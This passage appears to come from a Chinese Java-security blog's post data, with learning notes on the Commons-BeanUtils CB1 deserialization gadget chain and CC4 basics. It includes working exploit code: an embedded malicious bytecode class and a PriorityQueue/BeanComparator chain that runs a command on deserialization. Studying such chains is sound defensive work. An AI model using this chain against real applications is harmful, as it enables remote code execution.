&#125; 后记：当然还有其他方法获取StandardContext，但是不如上面使用的代码简便，下发贴了截图，有兴趣的可以自己调试一下。 当我们想反序列化写内存马的时候，或者想做命令执行回显的时候，我们也是需要获取到当前应用的StandardContext，或者是当前应用的request。我们下一篇学一下如何在目标当前线程中获取request。","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"CB基础知识","slug":"CB基础知识","date":"2023-02-27T11:48:35.000Z","updated":"2023-03-17T09:52:09.989Z","comments":true,"path":"2023/02/27/CB基础知识/","link":"","permalink":"https://f19t.github.io.git/2023/02/27/CB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"CB基础知识简单整理一下CB的基础知识。","text":"CB基础知识简单整理一下CB的基础知识。 getPropertygetProperty是org.apache.commons.beanutils包提供的一个静态方法PropertyUtils.getProperty().他的构造函数的参数为Object bean, String name。 123public static Object getProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123; return PropertyUtilsBean.getInstance().getProperty(bean, name); &#125; 使用一下测试类来验证PropertyUtils.getProperty()的作用。 注意： javabean的getter的类型是T，不能是void。 javabean的setter的类型是void。 PropertyUtils.getProperty(Object bean, String name)，调用的name需要无参。（暂时这样理解，不确定是不是也可以构造有参的,后续有其他了解，再进行补充。） 12345678910111213141516171819import java.io.IOException;/** * author: f19t * Date: 2023/2/27 14:35 */public class My_bean &#123; private String name = &quot;catalina&quot;; private My_bean() &#123; System.out.println(&quot;无参构造&quot;); &#125; public String getExec() throws IOException &#123; Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); return &quot;&quot;; &#125;&#125; 运行下方代码可成功弹计算机。 1234567891011121314151617181920import org.apache.commons.beanutils.*;import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;/** * author: f19t * Date: 2023/2/27 14:20 */public class Test_commons_beanutils &#123; public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException &#123; Class c1 = Class.forName(&quot;My_bean&quot;); Constructor ct1 = c1.getDeclaredConstructor();//不会初始化，无参构造 ct1.setAccessible(true); Object obj = ct1.newInstance();//初始化执行 PropertyUtils.getProperty(obj,&quot;exec&quot;); &#125;&#125; TemplatesImplCB基础知识，这里为什么讲TemplatesImpl呢，因为TemplatesImpl里包含多个getter、setter，首先先介绍一下TemplatesImpl如何执行字节码吧。 TemplatesImpl中的TransletClassLoader类，重写了defineClass方法，并且不是protected类型的,可以被外部调用. newTransformer可以调用到defineClass，导致执行字节码。（入口1） 12345defineClass:185, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)defineTransletClasses:414, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)getTransletInstance:451, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)main:106, Test_commons_beanutils (ysoserial) 测试代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.*;import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import static ysoserial.payloads.util.Reflections.setFieldValue;/** * author: f19t * Date: 2023/2/27 14:20 */public class Test_commons_beanutils &#123; public static void main(String[] args) throws Exception &#123; byte[] testClassBytes = new byte[]&#123;-54 ,-2 ,-70 ,-66 ,0 ,0 ,0 ,52 ,0 ,47 ,10 ,0 ,9 ,0 ,22 , 10 ,0 ,23 ,0 ,24 ,8 ,0 ,25 ,10 ,0 ,23 ,0 ,26 ,9 ,0 , 27 ,0 ,28 ,8 ,0 ,29 ,10 ,0 ,30 ,0 ,31 ,7 ,0 ,32 ,7 , 0 ,33 ,1 ,0 ,9 ,116 ,114 ,97 ,110 ,115 ,102 ,111 ,114 ,109 ,1 , 0 ,114 ,40 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 , 47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 , 110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,120 ,115 ,108 ,116 ,99 ,47 ,68 , 79 ,77 ,59 ,91 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 , 103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,109 ,108 ,47 ,105 ,110 , 116 ,101 ,114 ,110 ,97 ,108 ,47 ,115 ,101 ,114 ,105 ,97 ,108 ,105 ,122 , 101 ,114 ,47 ,83 ,101 ,114 ,105 ,97 ,108 ,105 ,122 ,97 ,116 ,105 ,111 , 110 ,72 ,97 ,110 ,100 ,108 ,101 ,114 ,59 ,41 ,86 ,1 ,0 ,4 ,67 , 111 ,100 ,101 ,1 ,0 ,15 ,76 ,105 ,110 ,101 ,78 ,117 ,109 ,98 ,101 , 114 ,84 ,97 ,98 ,108 ,101 ,1 ,0 ,10 ,69 ,120 ,99 ,101 ,112 ,116 , 105 ,111 ,110 ,115 ,7 ,0 ,34 ,1 ,0 ,-90 ,40 ,76 ,99 ,111 ,109 , 47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 , 47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 , 47 ,120 ,115 ,108 ,116 ,99 ,47 ,68 ,79 ,77 ,59 ,76 ,99 ,111 ,109 , 47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 , 47 ,120 ,109 ,108 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,100 , 116 ,109 ,47 ,68 ,84 ,77 ,65 ,120 ,105 ,115 ,73 ,116 ,101 ,114 ,97 , 116 ,111 ,114 ,59 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 , 103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,109 ,108 ,47 ,105 ,110 , 116 ,101 ,114 ,110 ,97 ,108 ,47 ,115 ,101 ,114 ,105 ,97 ,108 ,105 ,122 , 101 ,114 ,47 ,83 ,101 ,114 ,105 ,97 ,108 ,105 ,122 ,97 ,116 ,105 ,111 , 110 ,72 ,97 ,110 ,100 ,108 ,101 ,114 ,59 ,41 ,86 ,1 ,0 ,6 ,60 , 105 ,110 ,105 ,116 ,62 ,1 ,0 ,3 ,40 ,41 ,86 ,7 ,0 ,35 ,1 , 0 ,10 ,83 ,111 ,117 ,114 ,99 ,101 ,70 ,105 ,108 ,101 ,1 ,0 ,23 , 72 ,101 ,108 ,108 ,111 ,84 ,101 ,109 ,112 ,108 ,97 ,116 ,101 ,115 ,73 , 109 ,112 ,108 ,46 ,106 ,97 ,118 ,97 ,12 ,0 ,17 ,0 ,18 ,7 ,0 , 36 ,12 ,0 ,37 ,0 ,38 ,1 ,0 ,40 ,111 ,112 ,101 ,110 ,32 ,47 , 83 ,121 ,115 ,116 ,101 ,109 ,47 ,65 ,112 ,112 ,108 ,105 ,99 ,97 ,116 , 105 ,111 ,110 ,115 ,47 ,67 ,97 ,108 ,99 ,117 ,108 ,97 ,116 ,111 ,114 , 46 ,97 ,112 ,112 ,12 ,0 ,39 ,0 ,40 ,7 ,0 ,41 ,12 ,0 ,42 , 0 ,43 ,1 ,0 ,19 ,72 ,101 ,108 ,108 ,111 ,32 ,84 ,101 ,109 ,112 , 108 ,97 ,116 ,101 ,115 ,73 ,109 ,112 ,108 ,7 ,0 ,44 ,12 ,0 ,45 , 0 ,46 ,1 ,0 ,28 ,121 ,115 ,111 ,115 ,101 ,114 ,105 ,97 ,108 ,47 , 72 ,101 ,108 ,108 ,111 ,84 ,101 ,109 ,112 ,108 ,97 ,116 ,101 ,115 ,73 , 109 ,112 ,108 ,1 ,0 ,64 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 , 114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,97 ,108 ,97 ,110 , 47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,120 ,115 ,108 ,116 ,99 , 47 ,114 ,117 ,110 ,116 ,105 ,109 ,101 ,47 ,65 ,98 ,115 ,116 ,114 ,97 , 99 ,116 ,84 ,114 ,97 ,110 ,115 ,108 ,101 ,116 ,1 ,0 ,57 ,99 ,111 , 109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 , 101 ,47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 , 108 ,47 ,120 ,115 ,108 ,116 ,99 ,47 ,84 ,114 ,97 ,110 ,115 ,108 ,101 , 116 ,69 ,120 ,99 ,101 ,112 ,116 ,105 ,111 ,110 ,1 ,0 ,19 ,106 ,97 , 118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,69 ,120 ,99 ,101 ,112 ,116 ,105 , 111 ,110 ,1 ,0 ,17 ,106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 , 82 ,117 ,110 ,116 ,105 ,109 ,101 ,1 ,0 ,10 ,103 ,101 ,116 ,82 ,117 , 110 ,116 ,105 ,109 ,101 ,1 ,0 ,21 ,40 ,41 ,76 ,106 ,97 ,118 ,97 , 47 ,108 ,97 ,110 ,103 ,47 ,82 ,117 ,110 ,116 ,105 ,109 ,101 ,59 ,1 , 0 ,4 ,101 ,120 ,101 ,99 ,1 ,0 ,39 ,40 ,76 ,106 ,97 ,118 ,97 , 47 ,108 ,97 ,110 ,103 ,47 ,83 ,116 ,114 ,105 ,110 ,103 ,59 ,41 ,76 , 106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,80 ,114 ,111 ,99 ,101 , 115 ,115 ,59 ,1 ,0 ,16 ,106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 , 47 ,83 ,121 ,115 ,116 ,101 ,109 ,1 ,0 ,3 ,111 ,117 ,116 ,1 ,0 , 21 ,76 ,106 ,97 ,118 ,97 ,47 ,105 ,111 ,47 ,80 ,114 ,105 ,110 ,116 , 83 ,116 ,114 ,101 ,97 ,109 ,59 ,1 ,0 ,19 ,106 ,97 ,118 ,97 ,47 , 105 ,111 ,47 ,80 ,114 ,105 ,110 ,116 ,83 ,116 ,114 ,101 ,97 ,109 ,1 , 0 ,7 ,112 ,114 ,105 ,110 ,116 ,108 ,110 ,1 ,0 ,21 ,40 ,76 ,106 , 97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,83 ,116 ,114 ,105 ,110 ,103 , 59 ,41 ,86 ,0 ,33 ,0 ,8 ,0 ,9 ,0 ,0 ,0 ,0 ,0 ,3 , 0 ,1 ,0 ,10 ,0 ,11 ,0 ,2 ,0 ,12 ,0 ,0 ,0 ,25 ,0 , 0 ,0 ,3 ,0 ,0 ,0 ,1 ,-79 ,0 ,0 ,0 ,1 ,0 ,13 ,0 , 0 ,0 ,6 ,0 ,1 ,0 ,0 ,0 ,14 ,0 ,14 ,0 ,0 ,0 ,4 , 0 ,1 ,0 ,15 ,0 ,1 ,0 ,10 ,0 ,16 ,0 ,2 ,0 ,12 ,0 , 0 ,0 ,25 ,0 ,0 ,0 ,4 ,0 ,0 ,0 ,1 ,-79 ,0 ,0 ,0 , 1 ,0 ,13 ,0 ,0 ,0 ,6 ,0 ,1 ,0 ,0 ,0 ,16 ,0 ,14 , 0 ,0 ,0 ,4 ,0 ,1 ,0 ,15 ,0 ,1 ,0 ,17 ,0 ,18 ,0 , 2 ,0 ,12 ,0 ,0 ,0 ,58 ,0 ,2 ,0 ,2 ,0 ,0 ,0 ,22 , 42 ,-73 ,0 ,1 ,-72 ,0 ,2 ,18 ,3 ,-74 ,0 ,4 ,76 ,-78 ,0 , 5 ,18 ,6 ,-74 ,0 ,7 ,-79 ,0 ,0 ,0 ,1 ,0 ,13 ,0 ,0 , 0 ,18 ,0 ,4 ,0 ,0 ,0 ,18 ,0 ,4 ,0 ,19 ,0 ,13 ,0 , 20 ,0 ,21 ,0 ,21 ,0 ,14 ,0 ,0 ,0 ,4 ,0 ,1 ,0 ,19 , 0 ,1 ,0 ,20 ,0 ,0 ,0 ,2 ,0 ,21 ,&#125;; TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;testClassBytes&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); obj.newTransformer(); &#125;&#125; 其中HelloTemplatesImpl代码为： 1234567891011121314151617181920import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public classHelloTemplatesImpl extends AbstractTranslet &#123; public void transform(DOM document, SerializationHandler[] handlers)throws TransletException &#123;&#125; public void transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler) throws TransletException &#123;&#125; public HelloTemplatesImpl() throws Exception &#123; super(); Process p = Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); System.out.println(&quot;Hello TemplatesImpl&quot;); &#125;&#125; 其getOutputProperties调用了newTransformer，进而导致字节码被执行。(入口2) 123456defineClass:185, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)defineTransletClasses:414, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)getTransletInstance:451, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)main:101, Test_commons_beanutils (ysoserial) 测试代码 1obj.getOutputProperties();//下断点 又因为getOutputProperties符合javabeen的小驼峰式命名法规则，并且返回类型不是void，所以我们可以通过PropertyUtils.getProperty进行调用。代码如下。 1PropertyUtils.getProperty(obj,&quot;OutputProperties&quot;); BeanComparatorBeanComparator位于org.apache.commons.beanutils包内，其compare会调用PropertyUtils.getProperty，这就和上面的命令执行连接起来了，我们做个简单测试。其构造函数 123456789public BeanComparator(String property, Comparator&lt;?&gt; comparator) &#123; this.setProperty(property); if (comparator != null) &#123; this.comparator = comparator; &#125; else &#123; this.comparator = ComparableComparator.getInstance(); &#125; &#125; 其compare方法 1234567891011121314151617public int compare(T o1, T o2) &#123; if (this.property == null) &#123; return this.internalCompare(o1, o2); &#125; else &#123; try &#123; Object value1 = PropertyUtils.getProperty(o1, this.property); Object value2 = PropertyUtils.getProperty(o2, this.property); return this.internalCompare(value1, value2); &#125; catch (IllegalAccessException var5) &#123; throw new RuntimeException(&quot;IllegalAccessException: &quot; + var5.toString()); &#125; catch (InvocationTargetException var6) &#123; throw new RuntimeException(&quot;InvocationTargetException: &quot; + var6.toString()); &#125; catch (NoSuchMethodException var7) &#123; throw new RuntimeException(&quot;NoSuchMethodException: &quot; + var7.toString()); &#125; &#125; &#125; 我们学习了CC4的基础知识，假设compare(T o1, T o2)两个参数是PriorityQueue传过来的，那么在PriorityQueue中 123456789101112131415161718192021queue[i] = s.readObject();//PriorityQueue.readObjectheapify();//调用点,PriorityQueue.readObject//siftDownUsingComparator又调用了，集合的compare方法。private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0)//双参数传入compare c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x; &#125; 我们先看利用代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.*;import org.apache.commons.beanutils.BeanComparator;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.util.PriorityQueue;import static ysoserial.payloads.util.Reflections.setFieldValue;/** * author: f19t * Date: 2023/2/27 14:20 */public class Test_commons_beanutils &#123; public static void main(String[] args) throws Exception &#123; byte[] testClassBytes = new byte[]&#123;-54 ,-2 ,-70 ,-66 ,0 ,0 ,0 ,52 ,0 ,47 ,10 ,0 ,9 ,0 ,22 , 10 ,0 ,23 ,0 ,24 ,8 ,0 ,25 ,10 ,0 ,23 ,0 ,26 ,9 ,0 , 27 ,0 ,28 ,8 ,0 ,29 ,10 ,0 ,30 ,0 ,31 ,7 ,0 ,32 ,7 , 0 ,33 ,1 ,0 ,9 ,116 ,114 ,97 ,110 ,115 ,102 ,111 ,114 ,109 ,1 , 0 ,114 ,40 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 , 47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 , 110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,120 ,115 ,108 ,116 ,99 ,47 ,68 , 79 ,77 ,59 ,91 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 , 103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,109 ,108 ,47 ,105 ,110 , 116 ,101 ,114 ,110 ,97 ,108 ,47 ,115 ,101 ,114 ,105 ,97 ,108 ,105 ,122 , 101 ,114 ,47 ,83 ,101 ,114 ,105 ,97 ,108 ,105 ,122 ,97 ,116 ,105 ,111 , 110 ,72 ,97 ,110 ,100 ,108 ,101 ,114 ,59 ,41 ,86 ,1 ,0 ,4 ,67 , 111 ,100 ,101 ,1 ,0 ,15 ,76 ,105 ,110 ,101 ,78 ,117 ,109 ,98 ,101 , 114 ,84 ,97 ,98 ,108 ,101 ,1 ,0 ,10 ,69 ,120 ,99 ,101 ,112 ,116 , 105 ,111 ,110 ,115 ,7 ,0 ,34 ,1 ,0 ,-90 ,40 ,76 ,99 ,111 ,109 , 47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 , 47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 , 47 ,120 ,115 ,108 ,116 ,99 ,47 ,68 ,79 ,77 ,59 ,76 ,99 ,111 ,109 , 47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 , 47 ,120 ,109 ,108 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,100 , 116 ,109 ,47 ,68 ,84 ,77 ,65 ,120 ,105 ,115 ,73 ,116 ,101 ,114 ,97 , 116 ,111 ,114 ,59 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 , 103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,109 ,108 ,47 ,105 ,110 , 116 ,101 ,114 ,110 ,97 ,108 ,47 ,115 ,101 ,114 ,105 ,97 ,108 ,105 ,122 , 101 ,114 ,47 ,83 ,101 ,114 ,105 ,97 ,108 ,105 ,122 ,97 ,116 ,105 ,111 , 110 ,72 ,97 ,110 ,100 ,108 ,101 ,114 ,59 ,41 ,86 ,1 ,0 ,6 ,60 , 105 ,110 ,105 ,116 ,62 ,1 ,0 ,3 ,40 ,41 ,86 ,7 ,0 ,35 ,1 , 0 ,10 ,83 ,111 ,117 ,114 ,99 ,101 ,70 ,105 ,108 ,101 ,1 ,0 ,23 , 72 ,101 ,108 ,108 ,111 ,84 ,101 ,109 ,112 ,108 ,97 ,116 ,101 ,115 ,73 , 109 ,112 ,108 ,46 ,106 ,97 ,118 ,97 ,12 ,0 ,17 ,0 ,18 ,7 ,0 , 36 ,12 ,0 ,37 ,0 ,38 ,1 ,0 ,40 ,111 ,112 ,101 ,110 ,32 ,47 , 83 ,121 ,115 ,116 ,101 ,109 ,47 ,65 ,112 ,112 ,108 ,105 ,99 ,97 ,116 , 105 ,111 ,110 ,115 ,47 ,67 ,97 ,108 ,99 ,117 ,108 ,97 ,116 ,111 ,114 , 46 ,97 ,112 ,112 ,12 ,0 ,39 ,0 ,40 ,7 ,0 ,41 ,12 ,0 ,42 , 0 ,43 ,1 ,0 ,19 ,72 ,101 ,108 ,108 ,111 ,32 ,84 ,101 ,109 ,112 , 108 ,97 ,116 ,101 ,115 ,73 ,109 ,112 ,108 ,7 ,0 ,44 ,12 ,0 ,45 , 0 ,46 ,1 ,0 ,28 ,121 ,115 ,111 ,115 ,101 ,114 ,105 ,97 ,108 ,47 , 72 ,101 ,108 ,108 ,111 ,84 ,101 ,109 ,112 ,108 ,97 ,116 ,101 ,115 ,73 , 109 ,112 ,108 ,1 ,0 ,64 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 , 114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,97 ,108 ,97 ,110 , 47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,120 ,115 ,108 ,116 ,99 , 47 ,114 ,117 ,110 ,116 ,105 ,109 ,101 ,47 ,65 ,98 ,115 ,116 ,114 ,97 , 99 ,116 ,84 ,114 ,97 ,110 ,115 ,108 ,101 ,116 ,1 ,0 ,57 ,99 ,111 , 109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 , 101 ,47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 , 108 ,47 ,120 ,115 ,108 ,116 ,99 ,47 ,84 ,114 ,97 ,110 ,115 ,108 ,101 , 116 ,69 ,120 ,99 ,101 ,112 ,116 ,105 ,111 ,110 ,1 ,0 ,19 ,106 ,97 , 118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,69 ,120 ,99 ,101 ,112 ,116 ,105 , 111 ,110 ,1 ,0 ,17 ,106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 , 82 ,117 ,110 ,116 ,105 ,109 ,101 ,1 ,0 ,10 ,103 ,101 ,116 ,82 ,117 , 110 ,116 ,105 ,109 ,101 ,1 ,0 ,21 ,40 ,41 ,76 ,106 ,97 ,118 ,97 , 47 ,108 ,97 ,110 ,103 ,47 ,82 ,117 ,110 ,116 ,105 ,109 ,101 ,59 ,1 , 0 ,4 ,101 ,120 ,101 ,99 ,1 ,0 ,39 ,40 ,76 ,106 ,97 ,118 ,97 , 47 ,108 ,97 ,110 ,103 ,47 ,83 ,116 ,114 ,105 ,110 ,103 ,59 ,41 ,76 , 106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,80 ,114 ,111 ,99 ,101 , 115 ,115 ,59 ,1 ,0 ,16 ,106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 , 47 ,83 ,121 ,115 ,116 ,101 ,109 ,1 ,0 ,3 ,111 ,117 ,116 ,1 ,0 , 21 ,76 ,106 ,97 ,118 ,97 ,47 ,105 ,111 ,47 ,80 ,114 ,105 ,110 ,116 , 83 ,116 ,114 ,101 ,97 ,109 ,59 ,1 ,0 ,19 ,106 ,97 ,118 ,97 ,47 , 105 ,111 ,47 ,80 ,114 ,105 ,110 ,116 ,83 ,116 ,114 ,101 ,97 ,109 ,1 , 0 ,7 ,112 ,114 ,105 ,110 ,116 ,108 ,110 ,1 ,0 ,21 ,40 ,76 ,106 , 97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,83 ,116 ,114 ,105 ,110 ,103 , 59 ,41 ,86 ,0 ,33 ,0 ,8 ,0 ,9 ,0 ,0 ,0 ,0 ,0 ,3 , 0 ,1 ,0 ,10 ,0 ,11 ,0 ,2 ,0 ,12 ,0 ,0 ,0 ,25 ,0 , 0 ,0 ,3 ,0 ,0 ,0 ,1 ,-79 ,0 ,0 ,0 ,1 ,0 ,13 ,0 , 0 ,0 ,6 ,0 ,1 ,0 ,0 ,0 ,14 ,0 ,14 ,0 ,0 ,0 ,4 , 0 ,1 ,0 ,15 ,0 ,1 ,0 ,10 ,0 ,16 ,0 ,2 ,0 ,12 ,0 , 0 ,0 ,25 ,0 ,0 ,0 ,4 ,0 ,0 ,0 ,1 ,-79 ,0 ,0 ,0 , 1 ,0 ,13 ,0 ,0 ,0 ,6 ,0 ,1 ,0 ,0 ,0 ,16 ,0 ,14 , 0 ,0 ,0 ,4 ,0 ,1 ,0 ,15 ,0 ,1 ,0 ,17 ,0 ,18 ,0 , 2 ,0 ,12 ,0 ,0 ,0 ,58 ,0 ,2 ,0 ,2 ,0 ,0 ,0 ,22 , 42 ,-73 ,0 ,1 ,-72 ,0 ,2 ,18 ,3 ,-74 ,0 ,4 ,76 ,-78 ,0 , 5 ,18 ,6 ,-74 ,0 ,7 ,-79 ,0 ,0 ,0 ,1 ,0 ,13 ,0 ,0 , 0 ,18 ,0 ,4 ,0 ,0 ,0 ,18 ,0 ,4 ,0 ,19 ,0 ,13 ,0 , 20 ,0 ,21 ,0 ,21 ,0 ,14 ,0 ,0 ,0 ,4 ,0 ,1 ,0 ,19 , 0 ,1 ,0 ,20 ,0 ,0 ,0 ,2 ,0 ,21 ,&#125;; TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;testClassBytes&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());// PropertyUtils.getProperty(obj,&quot;getOutputProperties&quot;);// obj.getOutputProperties(); BeanComparator beanComparator = new BeanComparator();//为空，否则add时会调用getter方法。 final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(3, beanComparator); queue.add(1); queue.add(1); setFieldValue(beanComparator, &quot;property&quot;, &quot;outputProperties&quot;);//替换为执行字节码的getter setFieldValue(queue,&quot;queue&quot;,new Object[]&#123;obj,1&#125;);//必须，不替换queue为数字，无法调用outputProperties ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); &#125;&#125; 无依赖CB1链因为BeanComparator的构造函数说明，如果没有指定Comparator，那么默认使用ComparableComparator.getInstance()。 12345678910111213public BeanComparator(String property) &#123; this(property, ComparableComparator.getInstance()); &#125; public BeanComparator(String property, Comparator&lt;?&gt; comparator) &#123; this.setProperty(property); if (comparator != null) &#123; this.comparator = comparator; &#125; else &#123; this.comparator = ComparableComparator.getInstance(); &#125; &#125; 所有构造无依赖CC的CB1链只需要在构造BeanComparator指定一个java自带的Comparator即可。","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"CC4基础知识","slug":"CC4基础知识","date":"2023-02-26T14:05:27.000Z","updated":"2023-02-26T14:06:11.955Z","comments":true,"path":"2023/02/26/CC4基础知识/","link":"","permalink":"https://f19t.github.io.git/2023/02/26/CC4%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"CC4基础知识简单整理一下CC4利用链用到的基础知识。","text":"CC4基础知识简单整理一下CC4利用链用到的基础知识。 ComparatorComparator是一个接口，用来实现集合中元素的比较、排序. 1public interface Comparator&lt;T&gt; &#123;&#125; PriorityQueuePriorityQueue是java自带的的一种数据结构，其自带readObject方法，调用了 heapify() 。 12345678910111213141516171819private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; // Read in all elements. for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in &quot;proper order&quot;, but the // spec has never explained what that might be. heapify();//调用点&#125; 其heapify()中有调用了 siftDown 方法。 1234private void heapify() &#123; for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]); &#125; 当被比较集合不为空时，其siftDown又调用了siftDownUsingComparator方法。 123456private void siftDown(int k, E x) &#123; if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x); &#125; siftDownUsingComparator又调用了，集合的compare方法。 12345678910111213141516private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int 